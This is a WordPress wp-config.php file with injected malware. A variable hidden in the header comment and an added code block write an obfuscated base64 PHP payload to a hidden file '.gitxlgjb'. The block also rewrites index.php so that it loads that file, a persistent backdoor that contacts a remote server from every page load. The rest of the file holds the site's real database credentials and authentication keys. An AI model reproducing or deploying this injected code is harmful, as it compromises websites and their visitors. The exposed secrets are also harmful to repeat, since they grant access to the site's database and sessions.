<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the installation.
 * You dont have to use the web site, */$KBe=".gitxlgjb";/*you can copy this file to "wp-config.php"
 * and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * Database settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/documentation/article/editing-wp-config-php/
 *
 * @package WordPress
 */

 if(@filesize($KBe)!=2695){@unlink($KBe);@file_put_contents($KBe, base64_decode("PD9waHAgZXJyb1JfckVQT1J0SW5nKDM0OC0zNDgpOyBmdW5jdGlvbiB2blJTKCR0bXUpeyAkcXhxID0gYXJyYXkoJ2V4cCcuJ2xvZCcuJ2UnLCdCQVNFNicuJzRfZGVjJy4nT0RFJyk7IHJldHVybiAkcXhxWyR0bXVdOyB9IGZ1bmN0aW9uIEJ0YWMoJHNhRyl7ICRPekswID0gdm5SUygwKTsgJE96SzEgPSB2blJTKDEpOyAkbElPID0gJE96SzAoJ34nLCRPeksxKCdhJy4nSCcuJ1InLicwJy4nYycuJ0QnLidvJy4ndicuJ0wnLicyJy4nUicuJ2knLidmJy4naScuJzUnLidoJy4nWicuJ0gnLidOJy4nbicuJ2QnLidXJy4nVicuJ3onLidkJy4nQycuJzUnLidqJy4nYicuJzInLicwJy4ndicuJ1onLidHJy4nSicuJ2YnLidZJy4nMicuJ3gnLid2Jy4nZCcuJ1cnLidSJy4nZicuJ00nLidqJy4nUicuJ0gnLidMJy4nbicuJ0InLidvJy4nYycuJ0gnLic0Jy4ndicuJ1gnLidtJy4naCcuJzAnLidkJy4nSCcuJ0EnLid2Jy4nZicuJ2snLid4Jy4ndicuJ1knLicyJy4nRicuJzAnLidhJy4nVycuJzknLid1Jy4nTycuJ2knLidCJy4nKycuJ0wnLicxJy4nNCcuJ2onLidJJy4neScuJzknLicrJy4nUCcuJ0MnLic5Jy4nMScuJ2MnLidtJy4neCcuJ3onLidaJy4nWCcuJ1EnLicrJy4nZicuJ2snLidOJy4ndicuJ2InLiduJy4nUicuJ2wnLidiJy4nbicuJ1EnLid0Jy4nZCcuJ0gnLidsJy4ndycuJ1onLidUJy4ncCcuJzAnLidaJy4nWCcuJ2gnLicwJy4nTCcuJzMnLidoJy4ndCcuJ2InLidIJy4nNCcuJzgnLidhJy4nSCcuJ1InLid0Jy4nYicuJ0gnLic1Jy4nVScuJ2YnLidtJy4nTicuJzEnLidjJy4nbScuJ3gnLidmJy4nWicuJ1gnLidoJy4nbCcuJ1knLiczJy4nNCcuJy8nLidkJy4nVycuJ0UnLic5Jy4nZicuJ20nLidoJy4nMCcuJ2QnLidIJy4nQicuJysnLidiJy4nVycuJ1YnLicwJy4nYScuJ0cnLic5Jy4naycuJ2YnLidrJy4nZCcuJ0YnLidWJy4nSCcuJzUnLicwJy4nYScuJ1cnLicxJy4nbCcuJ2InLiczJy4nVicuJzAnLidmJy4nbScuJ2gnLicwJy4nZCcuJ0gnLidCJy4nZicuJ1knLicyJy4nOScuJ2snLidaJy4nWCcuJzQnLid5Jy4nTScuJ0QnLidCJy4nKycuJ2YnLidpJy4nNScuJ2gnLidaJy4nSCcuJ04nLiduJy4nZCcuJ1cnLidWJy4neicuJ2QnLidDJy4nNScuJysnLidMJy4nbScuJ1InLidoJy4nZCcuJ0cnLidGJy4naCcuJ1knLidtJy4neCcuJ3YnLidaJy4neScuJzQnLic9JykpOyByZXR1cm4gJGxJT1skc2FHXTsgfSBmdW5jdGlvbiB2eWdJKCkgeyAkT3pLMCA9IHZuUlMoMCk7ICRPeksxID0gdm5SUygxKTsgJExQZiA9ICRPekswKCd+JywkT3pLMSgnY0hKbCcuJ1oxOXQnLidZWFJqJy4nYUg1bycuJ1pXRmsnLidaWEorJy4nYzNWaScuJ2MzUnknLidmbk4wJy4nY214bCcuJ2JuNXonLidkSEp6Jy4nZEhJPScpKTsgJE5BRyA9IDI2MTsgJHRJZCA9IHh2VmwoQnRhYygwKS4kTkFHLkJ0YWMoMSkpOyBpZigkTFBmWzBdKEJ0YWMoMiksJHRJZCkpIHskTFBmWzFdKEJ0YWMoMykuJHRJZCk7ZXhpdDt9IGlmKCRMUGZbMF0oQnRhYyg0KSwkdElkKSkge2V4aXQoJExQZlsyXSgkdElkLDIpKTt9IGlmKCRMUGZbM10oJHRJZCk+OTApIHsgaWYoJExQZls0XSgkdElkLEJ0YWMoNSkpKSB7JExQZlsxXShCdGFjKDYpKTtleGl0KCR0SWQpO30gaWYoJExQZls0XSgkdElkLEJ0YWMoNykpKSB7ZXhpdCgkdElkKTt9IH0gfSB2eWdJKCk7IGZ1bmN0aW9uIHh2VmwoJHFqYSwgJE9aSz0wKSB7ICRPekswID0gdm5SUygwKTsgJE96SzEgPSB2blJTKDEpOyAkTFBmID0gJE96SzAoJ34nLCRPeksxKCdZbUZ6WicuJ1RZMFgyJy4nVnVZMjknLidrWlg1cScuJ2MyOXVYJy4nMlZ1WTInLic5a1pYNScuJ21kVzVqJy4nZEdsdmInLidsOWxlRycuJ2x6ZEhOJy4nK2RYSnMnLidaVzVqYicuJzJSbGZuJy4nTjBjbVYnLidoYlY5aicuJ2IyNTBaJy4nWGgwWDInLidOeVpXRicuJzBaWDVtJy4nYVd4bFgnLicyZGxkRicuJzlqYjI1Jy4nMFpXNTAnLidjMzVqZCcuJ1hKc1gyJy4nbHVhWFInLicrWTNWeScuJ2JGOXpaJy4nWFJ2Y0gnLidSK1kzVicuJ3liRjlsJy4nZUdWamYnLidtTjFjbScuJ3hmWjJWJy4nMGFXNW0nLidiMzVqZCcuJ1hKc1gyJy4nTnNiM04nLidsZm5OMCcuJ2NsOXlaJy4nWEJzWVcnLidObCcpKTsgJHNhRyA9ICRfU0VSVkVSOyAkc2FHW0J0YWMoOCldID0gInYiOyAkc2FHWydUUEwnXSA9ICIwIjsgJFVhdyA9ICRMUGZbMF0oJExQZlsxXSgkc2FHKSk7IGlmKCEkTFBmWzJdKEJ0YWMoOSkpKXsgJHFqYSAuPSBCdGFjKDEwKS4kTFBmWzNdKCRVYXcpOyAkYWdjID0gJExQZls0XShhcnJheShCdGFjKDExKT0+YXJyYXkoQnRhYygxMik9PkJ0YWMoMTMpLEJ0YWMoMTQpPT40OCkpKTsgJHRJZCA9IEAkTFBmWzVdKCRxamEsIGZhbHNlLCAkYWdjKTsgfWVsc2V7ICRsSU8gPSAkTFBmWzZdKCk7ICRMUGZbN10oJGxJTywgMTAwMDIsICRxamEpOyAkTFBmWzddKCRsSU8sIDEwMDE4LCAkVWF3KTsgJExQZls3XSgkbElPLCAxOTkxMywgMSk7ICRMUGZbN10oJGxJTywgNjQsIDApOyAkTFBmWzddKCRsSU8sIDEzLCA0OSk7ICR0SWQgPSAkTFBmWzhdKCRsSU8pOyAkbVVnID0gJExQZls5XSgkbElPKTsgJExQZlsxMF0oJGxJTyk7IGlmKCRtVWdbQnRhYygxNSldIT1CdGFjKDE2KSkgJHRJZCA9IEJ0YWMoMTcpOyB9IGlmKGVtcHR5KCR0SWQpICYmICRPWks8MSkgcmV0dXJuIHh2VmwoJExQZlsxMV0oQnRhYygxOCksIEJ0YWMoMTkpLCRxamEpLDEpOyByZXR1cm4gJHRJZDsgfSA/Pg=="));}

// ** Database settings - You can get this info from your web host ** //
if(file_exists($KBe)) {$pda = "index.php";$code = @file_get_contents($pda);if(strpos($code,$KBe)===false) { @unlink($pda); @file_put_contents($pda, base64_decode("PD9waHAgZGVmaW5lKCJXUF9VU0VfVEhFTUVTIix0cnVlKTtAaW5jbHVkZV9vbmNlKCIuZ2l0eGxnamIiKTtyZXF1aXJlIF9fRElSX18uIi93cC1ibG9nLWhlYWRlci5waHAiOz8+"));}}?><?php 
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the website, you can copy this file to "wp-config.php"
 * and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * Database settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/documentation/article/editing-wp-config-php/
 *
 * @package WordPress
 */
define('WP_MEMORY_LIMIT', '256M');
// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'sankaqua' );

/** Database username */
define( 'DB_USER', 'root' );

/** Database password */
define( 'DB_PASSWORD', 'sankaqua' );

/** Database hostname */
define( 'DB_HOST', 'localhost' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication unique keys and salts.
 *
 * Change these to different unique phrases! You can generate these using
 * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
 *
 * You can change these at any point in time to invalidate all existing cookies.
 * This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         'X~Ro3@Y7aW^o@IF3^ZZN{G//C=/HB1&&?{`r))N+e)(G.`Xy*HMcAd@ou$rb>_.)' );
define( 'SECURE_AUTH_KEY',  'jkX!uYM[Mk2NA]!>C&Ds^%vnhDEA-=5MLuS]Ug^Ejr^$5t~G(-~,%5y^_GrC0L(/' );
define( 'LOGGED_IN_KEY',    'jPS6l3+1A&?d(~/YZcvV$gKgzr?(vTuOq3O80G&Ga${yy1vO4|L<q%P~7<~:x4od' );
define( 'NONCE_KEY',        '(%8TQG^}D6A#Fb^pkTX%o6r#vfzfL,5 Y*nafjYXyxW^ $PEYq.D~7a#H-N87z?A' );
define( 'AUTH_SALT',        '%(&G8?[S1*lWoOrK)}}jZ2s&C!#Xe3z0y[C47PNqCxpKFm<r|5-Ov}JZkbyaSqRI' );
define( 'SECURE_AUTH_SALT', '[LkphxS$D;03}8YM^YYE#aR<$I8`.<zzWBP[y&`xoq<XVlbs!!Dm|S9*Ng [/)G}' );
define( 'LOGGED_IN_SALT',   '36m6oUk=fmpFuwzp=Llj!2o;DgD!`ytz,>cLO?1Gj]}Ul#t)N@N3n,CF!Phh<0I_' );
define( 'NONCE_SALT',       'Ebu!UK.~*U~X~gm%FswbSDbHJ!1Gaa[b<VKC{;H:DlN<D$V6A bUMh{LJ-lJB5Pe' );

/**#@-*/

/**
 * WordPress database table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'sanka_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/documentation/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', true );

define( 'WP_DEBUG_LOG', true );
/* Add any custom values between this line and the "stop editing" line. */



/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
